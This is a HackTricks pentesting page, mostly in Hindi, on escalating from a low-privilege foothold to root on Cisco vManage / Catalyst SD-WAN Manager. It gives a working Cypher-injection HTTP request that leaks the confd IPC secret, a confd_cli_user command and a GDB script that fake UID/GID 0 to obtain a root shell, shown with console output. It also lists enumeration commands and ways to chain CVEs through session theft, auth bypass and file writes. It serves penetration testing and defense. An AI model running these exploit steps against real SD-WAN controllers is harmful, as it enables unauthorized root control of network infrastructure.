# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

एक बार जब आपके पास Cisco vManage / *Catalyst SD-WAN Manager* पर `vmanage`, `netadmin`, या `vmanage-admin` के रूप में code execution हो जाए, तो सबसे interesting local privesc surfaces आमतौर पर `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs, और root-owned import/upload handlers होते हैं।

अगर आपको अभी भी controller पर **initial foothold** चाहिए, तो पहले dedicated control-plane page देखें:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
यदि `/etc/confd/confd_ipc_secret` आपके foothold से readable है, तो Path 1 और Path 2 तुरंत practical हो जाते हैं।

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

कुछ [documentation](http://66.218.245.39/doc/html/rn03re18.html) को `confd` और अलग-अलग binaries (Cisco website पर account के साथ accessible) के बारे में थोड़ा और dig करने के बाद, हमने पाया कि IPC socket को authenticate करने के लिए यह `/etc/confd/confd_ipc_secret` में located एक secret का use करता है:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
क्या आपको हमारी Neo4j instance याद है? यह `vmanage` user के privileges के तहत चल रही है, इसलिए हमें previous vulnerability का उपयोग करके file retrieve करने की अनुमति मिलती है:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` प्रोग्राम command line arguments support नहीं करता, लेकिन arguments के साथ `/usr/bin/confd_cli_user` को call करता है। इसलिए, हम सीधे `/usr/bin/confd_cli_user` को अपने खुद के arguments set के साथ call कर सकते हैं। हालांकि यह हमारी current privileges के साथ readable नहीं है, इसलिए हमें इसे rootfs से retrieve करना होगा और scp का उपयोग करके copy करना होगा, help पढ़नी होगी, और shell पाने के लिए इसका उपयोग करना होगा:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv team का blog¹ ने root shell पाने का एक elegant तरीका बताया था, लेकिन caveat यह है कि इसके लिए `/usr/bin/confd_cli_user` की एक copy चाहिए, जो केवल root द्वारा readable है। मुझे root तक escalate करने का एक और तरीका मिला, बिना इतनी hassle के।

जब मैंने `/usr/bin/confd_cli` binary को disassemble किया, तो मैंने निम्नलिखित देखा:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

जब मैं “ps aux” चलाता हूँ, मैंने निम्नलिखित देखा (_ध्यान दें -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
मैंने अनुमान लगाया कि “confd_cli” प्रोग्राम लॉग-इन किए गए यूज़र से एकत्र किए गए user ID और group ID को “cmdptywrapper” application को पास करता है।

मेरा पहला प्रयास “cmdptywrapper” को सीधे run करने और उसे `-g 0 -u 0` देने का था, लेकिन यह fail हो गया। ऐसा लगता है कि किसी point पर एक file descriptor (-i 1015) बनाया गया था और मैं उसे fake नहीं कर सकता।

जैसा कि synacktiv’s blog(last example) में बताया गया है, “confd_cli” प्रोग्राम command line argument support नहीं करता, लेकिन मैं इसे debugger के साथ influence कर सकता हूँ और fortunately system में GDB included है।

मैंने एक GDB script बनाई जिसमें मैंने API `getuid` और `getgid` को 0 return कराने के लिए force किया। चूँकि मेरे पास deserialization RCE के जरिए पहले से ही “vmanage” privilege है, इसलिए मुझे `/etc/confd/confd_ipc_secret` को सीधे read करने की permission है।

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Console output</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco ने बाद में अपने own advisory में [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) के लिए एक cleaner local root path documented किया: एक **authenticated attacker with only read-only privileges** manager CLI को एक crafted request भेज सकता था और insufficient input validation की वजह से root तक jump कर सकता था।

Offensive perspective से, यह important takeaway है:

1. जैसे ही आपके पास box पर *any* low-priv foothold हो, heavier Path 1 / Path 2 workflow पर जाने से पहले local CLI service को test करना चाहिए।
2. Path 2 के artifacts को reuse करके trust boundary ढूँढें: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend को forwarded हर field को suspicious मानें: UID/GID, username, terminal metadata, imported files, या कोई भी value जो बाद में root-owned helper द्वारा consume की जाती है।
4. अगर low-priv user local CLI socket तक पहुँच सकता है और उन fields को influence कर सकता है, तो root सिर्फ एक crafted request दूर हो सकता है।

Appliance पर land करने के बाद एक practical workflow है:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
यह 2025 bug को समान versions के लिए एक अच्छा hunting pattern में बदल देता है: **local CLI shims** खोजें जो userland में identity collect करते हैं और उसे अधिक privileged wrapper को forward करते हैं।

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco की February 2026 advisory ने एक और useful privesc class भी introduced की: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) ने एक **authenticated, local attacker with low privileges** को root gain करने की अनुमति दी क्योंकि REST API में user-authentication mechanism insufficient था।

यह matters because vManage privesc अब सिर्फ `confd`/TTY abuse तक सीमित नहीं है। एक low-priv shell के बाद, यह भी hunt करें:

- localhost-only API endpoints जो caller पर बहुत ज़्यादा trust करते हैं
- tokens, cookies, या service credentials जो current account से readable हों
- root-only actions जो `dataservice`/REST handlers के माध्यम से exposed हों और फिर भी locally triggered किए जा सकते हों

Practical तौर पर, एक बार जब आपके पास `vmanage` या किसी अन्य service user के रूप में shell हो, local API abuse अक्सर interactive CLI abuse की तुलना में quieter और automate करने में आसान होती है:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
यदि local session context privileged REST functionality को हिट करने के लिए पर्याप्त है, तो API path को prefer करें: इसे replay करना, script करना, और stolen web sessions या API tokens के साथ chain करना आसान है।

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

एक और हालिया pattern है [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): `netadmin` privileges वाला local attacker एक **crafted file** upload कर सकता था, जिसे बाद में CLI unsafe तरीके से handle करता था, जिससे `root` के रूप में command injection हो जाती थी।

HackTricks के नजरिए से, valuable technique specific CVE से कहीं व्यापक है:

1. हर CLI या web workflow को enumerate करें जो file accept करता है: imports, diagnostic bundles, templates, validators, backups, tenant data, आदि।
2. Trace करें कि uploaded file कहाँ जाती है और कौन-सा root-owned script या binary उसे consume करता है।
3. Test करें कि filename, file content, या parsed metadata कभी shell commands, wrapper scripts, या `system()`-style helpers को pass किया जाता है या नहीं।
4. अगर आप पहले से `netadmin` तक पहुंच सकते हैं (valid creds, stolen session, या auth-bypass chain), तो file-processing bugs अक्सर root तक पहुंचने का सबसे तेज़ path होते हैं।

यह bug class विशेष रूप से उन remote footholds के साथ अच्छी तरह chain होती है जो `netadmin` देती हैं लेकिन `root` नहीं।

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Authenticated UI XSS (CVE-2024-20475)** – web UI में admin session चुराएं, फिर API/CLI actions में pivot करें जो अंततः `vshell` या ऊपर दिए गए local privesc paths में से किसी एक तक पहुंचती हैं।
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Path 5 के लिए बहुत मजबूत precursor, क्योंकि `netadmin` वही level है जो 2026 crafted-file privesc के लिए आवश्यक है।
- **Authenticated arbitrary file write (CVE-2026-20262)** – बाद में privileged components द्वारा parse होने वाली files drop करने या root-owned helpers द्वारा consume किए गए operational artifacts को overwrite करने के लिए उपयोगी।
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – dedicated SD-WAN control-plane page में बेहतर documented है; यह `vmanage-admin` के लिए SSH key append कर सकता है, जिससे आपको local foothold मिलता है और आप इस page पर वापस आ सकते हैं।

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
